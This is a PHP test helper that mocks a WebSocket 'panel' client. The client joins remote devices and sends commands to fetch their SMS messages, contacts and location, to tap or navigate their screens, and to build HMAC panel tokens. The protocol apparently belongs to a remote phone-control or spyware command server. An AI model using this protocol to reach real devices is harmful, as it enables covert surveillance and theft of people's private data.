<?php

declare(strict_types=1);

namespace Tests\Support;

class MockPanel extends WebSocketTestClient
{
    private string $userEmail;

    private ?string $subscribedDevice = null;

    private string $token;

    public function __construct(string $encryptedEmail, array $options = [])
    {
        parent::__construct(
            $options['host'] ?? 'localhost',
            $options['port'] ?? 8081
        );

        $this->userEmail = $encryptedEmail;
        $this->token = $options['token'] ?? '';
    }

    public function getUserEmail(): string
    {
        return $this->userEmail;
    }

    public function getToken(): string
    {
        return $this->token;
    }

    public function setToken(string $token): void
    {
        $this->token = $token;
    }

    public function subscribe(): bool
    {
        $message = [
            'subc' => 'subscribe',
            'email' => $this->userEmail,
        ];

        if ($this->token !== '') {
            $message['token'] = $this->token;
        }

        return $this->send($message);
    }

    public function checkPhone(int $page = 1, int $pageSize = 100, array $filters = []): bool
    {
        $message = [
            'subc' => 'checkphone',
            'email' => $this->userEmail,
            'page' => $page,
            'pageSize' => $pageSize,
            'filters' => $filters,
        ];

        if ($this->token !== '') {
            $message['token'] = $this->token;
        }

        return $this->send($message);
    }

    public function joinDevice(string $deviceId): bool
    {
        $this->subscribedDevice = $deviceId;

        $message = [
            'itype' => 'slr_panel',
            'subc' => 'join',
            'pid' => $deviceId,
        ];

        if ($this->token !== '') {
            $message['token'] = $this->token;
        }

        return $this->send($message);
    }

    public function pingDevice(?string $deviceId = null): bool
    {
        return $this->send([
            'itype' => 'slr_panel',
            'subc' => 'ping',
            'pid' => $deviceId ?? $this->subscribedDevice,
        ]);
    }

    public function requestSms(): bool
    {
        if (! $this->subscribedDevice) {
            return false;
        }

        return $this->send([
            'itype' => 'slr_panelsend',
            'subc' => 'SMS',
            'pid' => $this->subscribedDevice,
        ]);
    }

    public function requestContacts(): bool
    {
        if (! $this->subscribedDevice) {
            return false;
        }

        return $this->send([
            'itype' => 'slr_panelsend',
            'subc' => 'Contacts',
            'pid' => $this->subscribedDevice,
        ]);
    }

    public function requestLocation(): bool
    {
        if (! $this->subscribedDevice) {
            return false;
        }

        return $this->send([
            'itype' => 'slr_panelsend',
            'subc' => 'loc',
            'pid' => $this->subscribedDevice,
        ]);
    }

    public function sendTap(int $x, int $y): bool
    {
        if (! $this->subscribedDevice) {
            return false;
        }

        return $this->send([
            'itype' => 'slr_panel',
            'subc' => 'screen',
            'pid' => $this->subscribedDevice,
            'comand' => 'mov',
            'movetype' => '0',
            'poi' => "{$x},{$y}",
        ]);
    }

    public function sendNavigation(string $nav): bool
    {
        if (! $this->subscribedDevice) {
            return false;
        }

        return $this->send([
            'itype' => 'slr_panel',
            'subc' => 'screen',
            'pid' => $this->subscribedDevice,
            'comand' => 'nav',
            'navshort' => $nav,
        ]);
    }

    public function getSubscribedDevice(): ?string
    {
        return $this->subscribedDevice;
    }

    /**
     * Generate a valid panel token for testing.
     * Looks up user/admin by email to determine guard and userId.
     */
    public static function generateTestPanelToken(string $email): string
    {
        $secret = WebSocketTestServer::getTestSecret();

        // Check admin first
        $admin = \App\Models\Admin::where('email', $email)->first();
        if ($admin !== null) {
            $timestamp = time();
            $hmac = hash_hmac('sha256', "{$admin->id}|admin|{$timestamp}", $secret);

            return "{$hmac}.{$admin->id}.admin.{$timestamp}";
        }

        // Then check user
        $user = \App\Models\User::where('email', $email)->first();
        if ($user !== null) {
            $timestamp = time();
            $hmac = hash_hmac('sha256', "{$user->id}|web|{$timestamp}", $secret);

            return "{$hmac}.{$user->id}.web.{$timestamp}";
        }

        throw new \RuntimeException("No user or admin found with email: {$email}");
    }

    /**
     * Generate an invalid panel token (wrong HMAC) for testing.
     */
    public static function generateInvalidPanelToken(): string
    {
        $fakeHmac = hash('sha256', 'invalid-secret-data');

        return "{$fakeHmac}.999.web.".time();
    }

    /**
     * Generate an expired panel token for testing.
     */
    public static function generateExpiredPanelToken(string $email): string
    {
        $secret = WebSocketTestServer::getTestSecret();

        $user = \App\Models\User::where('email', $email)->first();
        if ($user === null) {
            $admin = \App\Models\Admin::where('email', $email)->first();
            if ($admin === null) {
                throw new \RuntimeException("No user or admin found with email: {$email}");
            }
            $userId = $admin->id;
            $guard = 'admin';
        } else {
            $userId = $user->id;
            $guard = 'web';
        }

        // Expired: 10 minutes ago
        $timestamp = time() - 600;
        $hmac = hash_hmac('sha256', "{$userId}|{$guard}|{$timestamp}", $secret);

        return "{$hmac}.{$userId}.{$guard}.{$timestamp}";
    }
}
